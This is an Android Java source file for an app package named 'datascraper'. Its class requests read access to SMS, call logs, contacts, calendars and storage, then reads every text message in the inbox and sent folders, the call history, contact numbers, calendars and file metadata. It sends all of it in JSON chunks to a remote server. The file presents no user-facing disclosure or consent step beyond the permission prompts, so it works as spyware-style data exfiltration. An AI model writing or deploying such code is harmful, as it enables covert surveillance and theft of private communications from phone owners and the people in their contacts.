package com.example.alex.datascraper;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

/**
 * Class for scraping data from a smart phone. Creates seperate threads for scraping data into chunks
 * and sending it to a server. Also tracks which threads are still running.
 */

public class modalityHabits{

    private AppCompatActivity parent;

    // approximate chunk size of data to send
    // must send complete json objects so usually more characters will send
    // MEASURED IN CHARACTERS NOT BITS OR BYTES
    private final int chunkSize = 500;

    // for tracking progession on data sending
    public static int activeThreads = 0; // number of threads currently sending data
    private boolean dispatchDone = false; // true when thread dispatcher has dispatched all available threads

    // True when done sending data
    public static boolean DONE = false;

    private static final int ASK_MULTIPLE_PERMISSION_REQUEST_CODE = 1;

    // String array for requesting permissions
    private static final String[] permissions = new String[]{
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
    };

    // constants for telling which boolean in the send array pertains to which modality
    private static final int CALENDAR = 0;
    private static final int CONTACTS = 1;
    private static final int CALLS = 2;
    private static final int TEXT = 3;
    private static final int STORAGE = 4;

    // holds which modalities are waiting for permissions to be granted
    private ArrayList<Integer> waiting = new ArrayList<Integer>();
    // boolean array for modalities, true indicates that the modality send thread has been launched
    private boolean[] send = {false, false, false, false, false};

    // booleans for tracking send thread dispatching, true when done dispatching
    private boolean mainDataDispatchingFinished = false; // true when done dispatching granted permissions
    private boolean permissionsDataDispatchingFinished = false; // true when done attempting to dispatch new permissions

    // boolean for preventing data from being sent multiple times
    private static boolean dataSent = false;

    // Initaite a modalityHabits class within an Activity
    public modalityHabits(AppCompatActivity parent){
        this.parent = parent;
    }

    // Sychronized Getters and Setters ------------------------------------------------------------
    // synchronized method for changing activeThreads to avoid race conditions
    private synchronized void changeActiveThreads(int d) {
        activeThreads += d;
        checkIfDone();
    }

    // synchronized method for changing dispatchDone to avoid race conditions (maybe not needed?)
    public synchronized void dispatchDone(){
        dispatchDone = true;
        checkIfDone();
        Log.d("MYAPP", "DISPATCH DONE");
    }

    // synchronized method for checking both activeThreads and dispatchDone to see if all sending is finished
    public synchronized void checkIfDone(){
        // when all threads that will be started have been started and also finished, mark as done sending
        // and send the END message to the server
        if(activeThreads <= 0 && dispatchDone){
            Log.d("MYAPP", "ALL DONE");
            DONE = true;
        }
    }

    // ---------------------------------------------------------------------------------------------

    // Start the data scraping
    public void start() {

        // send all available data in a seperate thread from the UI, as long as it hasnt already been started
        if(!dataSent){
            serverHook.start();
            Log.d("MYAPP", "OBTAINED ID: " + serverHook.identifier);
            if(serverHook.identifier.equals("")){
                parent.startActivity(new Intent(parent, internetActivity.class));
                return;
            }
            dataSent = true;

            Thread t = new Thread(){
                public void run() {
                    sendAllAvailableData();
                }
            };
            t.start();
        }

    }

    /**
     * Sends all data that the app can scrape to a server
     * Ignores data that permissions were denied for
     */
    public void sendAllAvailableData(){
        Context mContext = parent.getApplicationContext();
        serverHook.sendToServer("debug","START");
        Log.d("MYAPP", "GO");

        // list holding modalities for which the app is waiting for permissions to be granted
        waiting = new ArrayList<Integer>();

        // check if the app has permissions for each modality
        // if yes, mark as ready to send
        // if no, add to list of awaited permissions

        //request calendar access if access not already available
        if(parent.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED){
            send[CALENDAR] = true;
        }
        else{
            waiting.add(CALENDAR);
        }
        //request contacts access if access not already available
        if(parent.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
            send[CONTACTS] = true;
        }
        else{
            waiting.add(CONTACTS);
        }
        if(parent.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            send[CALLS] = true;
        }
        else{
            waiting.add(CALLS);
        }
        if(parent.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
            send[TEXT] = true;
        }
        else{
            waiting.add(TEXT);
        }
        //request storage access if access not already available
        if(parent.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
            send[STORAGE] = true;
        }
        else{
            waiting.add(STORAGE);
        }


        // ask for permission for all needed data types. If the app already has any they will be ignored
        ActivityCompat.requestPermissions(parent, permissions, ASK_MULTIPLE_PERMISSION_REQUEST_CODE);

        // send all data types that were marked as having permissions already
        if(send[CALENDAR]){
            getHabit(mContext, "calendar");
        }
        if(send[CONTACTS]){
            getHabit(mContext, "contacts");
        }
        if(send[CALLS]){
            getHabit(mContext, "calls");
        }
        if(send[TEXT]) {
            getHabit(mContext, "texts");
        }
        if(send[STORAGE]){
            getHabit(mContext, "files");
        }


        // mark the main data dispatch as done
        mainDataDispatchingFinished = true;
        // see if all dispatching has been finished
        checkIfFinishedDispatching();

    }



    // Launches a new data scraping thread
    // mContext is the context for scraping the data
    // habit is a string representing the type of data being scraped
    public void getHabit(Context mContext, String habit){
        // add to number of threads running
        changeActiveThreads(1);
        // start a new thread
        Thread t = new Thread(new HabitsRunner(mContext, habit));
        t.start();
    }

    // Gateway for starting modality scraping threads
    private class HabitsRunner implements Runnable{

        private Context mContext; //context for scraping the data
        private String habit; // string representing the type of data being scraped

        // store these values for running
        public HabitsRunner(Context c, String h){
            mContext = c;
            habit = h;
        }

        // send the appropriate data when the thread is started
        @Override
        public void run(){
            try {
                switch(habit){
                    case "texts":
                        sendTexts();
                        break;
                    case "calls":
                        sendCalls();
                        break;
                    case "contacts":
                        sendContacts();
                        break;
                    case "calendar":
                        sendCalendar();
                        break;
                    case "files":
                        sendFiles();
                        break;
                    default:
                        Log.d("NOTFOUND", habit);
                }
                Log.d("MYAPP", habit + " DONE");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }
            finally{
                // afterwards, remove an active thread and then check if all threads have finished
                changeActiveThreads(-1);
                checkIfDone();
            }
        }

        /*
        The rest of this class is just the functions for scraping each type of data
         */

        private void sendTexts(){
            List<String> texts = new ArrayList<>();

            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            String colName, val;
            String msgData = "[";

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";

                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);

                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }

                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";

                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        serverHook.sendToServer("text", msgData);
                        msgData = "[";
                    }
                    //serverHook.sendToServer("text",msgData);
                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();

            // sent cursor
            cursor = mContext.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);

                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }

                    }

                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        serverHook.sendToServer("text", msgData);
                        msgData = "[";
                    }
                    //serverHook.sendToServer("text",msgData);
                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("text", msgData);
            }

        }

        private void sendCalls(){
            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);

            String colName, val;
            String msgData = "[";

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }

                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        serverHook.sendToServer("log", msgData);
                        msgData = "[";
                    }

                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("log", msgData);
            }
        }

        private void sendContacts(){
            ContentResolver cr = mContext.getContentResolver();
            Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if(phone == null){
                return;
            }
            Cursor conCursor;
            String id, name, number;
            String msgData = "[";
            while(phone != null && phone.moveToNext()){
                name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                name = name.replace("\"", "'");
                name = name.replace("\n", " ");
                id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
                msgData += "{";
                msgData += "\"name\":\"" + name + "\",";

                if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                    conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null);
                    while(conCursor.moveToNext()){
                        number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        msgData += "\"number\":\"" + number + "\",";
                    }
                    conCursor.close();
                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("contact", msgData);
                    msgData = "[";
                }
            }
            phone.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("contact", msgData);
            }
        }

        private void sendCalendar(){
            String msgData = "[";
            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String colName, val;
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        serverHook.sendToServer("calendar", msgData);
                        msgData = "[";
                    }

                } while (cursor.moveToNext());
            } else {
                System.out.println("No events found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("calendar", msgData);
            }
        }

        private void sendFiles(){
            String msgData = "[";

            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://media/external/file/"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String colName, val;
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        serverHook.sendToServer("file", msgData);
                        msgData = "[";
                    }
                } while (cursor.moveToNext());
            } else {
                System.out.println("No events found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("file", msgData);
            }
        }
    }

    /* checks if all available modality sending threads have been dispatched
    * this is important for detecing if the app is done sending all available data
     */
    private void checkIfFinishedDispatching(){
        if(mainDataDispatchingFinished && permissionsDataDispatchingFinished){;
            dispatchDone(); // tell modalityHabits that the mainactivity is done dispatching
            mainDataDispatchingFinished = false;
            permissionsDataDispatchingFinished = false;
        }
    }

    /*
     For handling permission request responses
     */
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {

        Context mContext = parent.getApplicationContext();

        // Try to send each modality again, if permissions were not granted they will fail gracefully

        if(!send[TEXT] && !permissionsDataDispatchingFinished){
            try {
                getHabit(mContext, "texts");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[CALLS] && !permissionsDataDispatchingFinished){
            try {
                getHabit(mContext, "calls");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[CALENDAR] && !permissionsDataDispatchingFinished){
            try {
                getHabit(mContext, "calendar");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[STORAGE] && !permissionsDataDispatchingFinished){
            try {
                getHabit(mContext, "files");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }
        }
        if(!send[CONTACTS] && !permissionsDataDispatchingFinished){
            try {
               getHabit(mContext, "contacts");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }

        // mark permissions response dispatcher as done and check if done dispatching
        permissionsDataDispatchingFinished = true;
        checkIfFinishedDispatching();

    }

}
